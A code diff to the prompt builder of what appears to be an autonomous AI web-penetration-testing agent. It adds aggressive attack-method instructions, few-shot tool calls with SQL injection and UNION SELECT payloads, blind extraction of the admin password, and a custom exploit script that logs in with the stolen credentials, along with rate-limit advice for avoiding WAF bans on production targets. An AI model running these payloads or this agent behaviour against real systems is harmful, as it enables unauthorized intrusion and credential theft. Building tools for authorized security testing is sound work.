@@ -497,6 +497,26 @@ escalate to account takeover
 - **DO NOT WASTE TIME ON**: CORS testing, header enumeration, technology fingerprinting, \
 WAF detection, robots.txt analysis, sitemap crawling beyond initial recon. These are \
 scanner-level tasks. Spend your budget on DEEP testing of promising attack vectors.
+
+### CRITICAL: No Repetition / Be Creative
+- **NEVER repeat a technique on the same endpoint.** Check "Testing Progress" above. If it's listed, \
+it's DONE. Move on.
+- **Think like a $100K bug bounty hunter.** The obvious tests are already done. You MUST be creative:
+  1. **Chain vulns together** — combine info disclosure + SSRF + auth bypass for bigger impact
+  2. **Race conditions** — concurrent requests to payment/transfer/vote endpoints
+  3. **Business logic** — buy negative quantities, use expired coupons, skip steps in wizards
+  4. **Second-order injection** — store XSS/SQLi via profile, trigger via admin view/export/PDF
+  5. **OAuth/SSO flaws** — redirect_uri manipulation, state parameter CSRF, token leakage
+  6. **WebSocket testing** — check ws:// endpoints for auth bypass, injection, IDOR
+  7. **GraphQL depth/complexity** — nested queries, alias batching, field suggestion enumeration
+  8. **Deserialization** — test upload/import features with serialized payloads
+  9. **Cache poisoning** — Host header, X-Forwarded-Host, parameter cloaking
+  10. **API versioning** — /v1/ vs /v2/ vs /v3/, /internal/, /debug/, /admin/
+  11. **Mobile API** — different User-Agent, /api/mobile/, different auth flows
+  12. **Subdomain takeover** — dangling CNAME, unclaimed cloud resources
+  13. **Email-based attacks** — password reset poisoning, Host header in email links
+  14. **JWT attacks** — algorithm confusion, key ID injection, claim manipulation
+- **Every 5 turns, ask yourself:** "What attack surface have I NOT touched yet?" Then go test it.
 """
 
 
@@ -659,6 +679,73 @@ def _get_available_tools() -> str:
     return _cached_tools
 
 
+# ── Few-shot examples for free brain models (Z.ai GLM-5) ──────────────
+# These teach the model the exact output format through worked examples.
+# Only injected when is_free_brain is True (zero cost — Z.ai is free).
+
+FREE_BRAIN_FEW_SHOT = """
+
+# WORKED EXAMPLES — Follow this exact output format
+
+Below are example turns showing the correct reasoning → tool call format.
+Study these carefully. Your output MUST follow this pattern.
+
+## Example 1: Starting Recon
+I need to map the attack surface first. Let me crawl the target to discover
+endpoints, forms, technologies, and hidden paths.
+
+{"name": "crawl_target", "input": {"start_url": "http://localhost:5000", "max_pages": 30}}
+
+## Example 2: Testing Parameters for SQL Injection
+The crawl found a POST form at /search with parameters: q, category, sort.
+I need to test each parameter individually — most apps use prepared statements
+for most params but may string-interpolate one directly.
+
+{"name": "response_diff_analyze", "input": {"base_request": {"url": "http://localhost:5000/search", "method": "POST", "body": {"q": "test", "category": "all", "sort": "name"}}, "test_requests": [{"label": "q_sqli", "body": {"q": "test'", "category": "all", "sort": "name"}}, {"label": "category_sqli", "body": {"q": "test", "category": "all'", "sort": "name"}}, {"label": "sort_sqli", "body": {"q": "test", "category": "all", "sort": "name'"}}]}}
+
+## Example 3: Following Up on SQL Error
+The response_diff_analyze shows the 'q' parameter triggers a MySQL syntax error
+when a single quote is appended. This confirms SQL injection. Let me test
+UNION SELECT to determine column count and extract data.
+
+{"name": "send_http_request", "input": {"url": "http://localhost:5000/search", "method": "POST", "body": "q=' UNION SELECT 1,2,3-- -&category=all&sort=name"}}
+
+## Example 4: Bypassing 403 Forbidden
+Got 403 on /admin. Before giving up, I should try path-based bypass techniques
+using the built-in 403 bypass wordlist.
+
+{"name": "systematic_fuzz", "input": {"url_template": "http://localhost:5000/{FUZZ}", "wordlist": "403-bypass-paths"}}
+
+## Example 5: Discovering Hidden Content
+I need to find hidden directories and files. Let me run content discovery with
+the common directories and files wordlists.
+
+{"name": "systematic_fuzz", "input": {"url_template": "http://localhost:5000/{FUZZ}", "wordlist": "common-dirs", "match_status": [200, 301, 302, 403]}}
+
+## Example 6: Exploiting Blind SQLi
+The search endpoint is vulnerable to blind SQL injection. I can use the
+blind_sqli_extract tool to automatically extract data using binary search.
+
+{"name": "blind_sqli_extract", "input": {"url": "http://localhost:5000/search", "method": "POST", "param_name": "q", "query": "SELECT password FROM users WHERE username='admin'"}}
+
+## Example 7: Recording Findings and Finishing
+I found the flag in the admin panel: FLAG{example123}. Let me record this
+finding and finish the test.
+
+{"name": "update_knowledge", "input": {"findings": {"admin_sqli": {"vuln_type": "sqli", "endpoint": "/search", "parameter": "q", "evidence": "UNION-based extraction yielded admin credentials", "severity": "critical", "confirmed": true}}}}
+{"name": "finish_test", "input": {"assessment": "Found SQL injection at /search parameter 'q'. Extracted admin credentials via UNION SELECT. Logged in to admin panel and found flag."}}
+
+## Example 8: Custom Exploit Script
+The vulnerability requires a multi-step exploit. Let me write a custom
+Python script to chain the steps together.
+
+{"name": "run_custom_exploit", "input": {"code": "import httpx\\nclient = httpx.Client()\\n# Step 1: Extract admin password via blind SQLi\\nr = client.post('http://localhost:5000/search', data={'q': \\\"' UNION SELECT password FROM users WHERE role='admin'-- -\\\"})\\nprint(r.text)\\n# Step 2: Login with extracted creds\\nr2 = client.post('http://localhost:5000/login', data={'username': 'admin', 'password': r.text.strip()})\\nprint(r2.text)"}}
+
+REMEMBER: Your response MUST end with a JSON tool call on its own line.
+Write reasoning first, then the JSON. Never put JSON inside ``` code blocks.
+"""
+
+
 def build_static_prompt() -> str:
     """Return the static methodology portion of the system prompt.
 
@@ -666,6 +753,15 @@ def build_static_prompt() -> str:
     via cache_control in the system blocks.
     """
     return STATIC_SYSTEM_PROMPT
+
+
+def build_free_brain_prompt() -> str:
+    """Return static prompt + few-shot examples for free brain models.
+
+    Used by Z.ai/ChatGPT instead of build_static_prompt(). Includes
+    worked examples that teach the exact tool calling format.
+    """
+    return STATIC_SYSTEM_PROMPT + FREE_BRAIN_FEW_SHOT
 
 
 def build_dynamic_prompt(state: dict[str, Any]) -> str:
@@ -795,10 +891,19 @@ def _build_dynamic_state(state: dict[str, Any]) -> str:
 
     if tested:
         dedup_lines.append(f"  Techniques tested: {len(tested)}")
-        # Show last 10 tested (most recent)
-        recent_tested = list(tested.keys())[-10:]
-        for key in recent_tested:
-            dedup_lines.append(f"    - {key}")
+        # Group ALL tested techniques by endpoint for full visibility
+        by_endpoint: dict[str, list[str]] = {}
+        for key in tested:
+            parts = key.split("::", 1)
+            ep = parts[0] if parts[0] else "(global)"
+            tool = parts[1] if len(parts) > 1 else key
+            by_endpoint.setdefault(ep, []).append(tool)
+        for ep, tools in sorted(by_endpoint.items()):
+            dedup_lines.append(f"    [{ep}]: {', '.join(tools)}")
+        dedup_lines.append("")
+        dedup_lines.append("  ⚠️ DO NOT REPEAT any technique listed above on the same endpoint.")
+        dedup_lines.append("  You MUST try something NEW — different endpoints, different params,")
+        dedup_lines.append("  different attack classes, or completely unexplored surfaces.")
     if failed:
         dedup_lines.append(f"  Failed approaches: {len(failed)}")
         for key, err in list(failed.items())[-5:]:
@@ -2508,6 +2613,15 @@ def _generate_situational_hints(state: dict) -> str:
             f"send_http_request. Without no_auth=true, any 'auth bypass' you find is FAKE "
             f"because the default Authorization header is still being sent."
         )
+
+    # Hint: Rate limiting warning — always present for production targets
+    hints.insert(0,
+        "⚠️ RATE LIMITING ACTIVE: All HTTP requests are rate-limited to ~1 req/sec to "
+        "avoid WAF/Cloudflare IP bans. Be strategic with requests — avoid redundant "
+        "requests, batch related tests, and prefer targeted probes over broad scans. "
+        "Do NOT call systematic_fuzz with large wordlists unless critical. "
+        "Prefer fewer, smarter requests over brute-force enumeration."
+    )
 
     if not hints:
         return ""
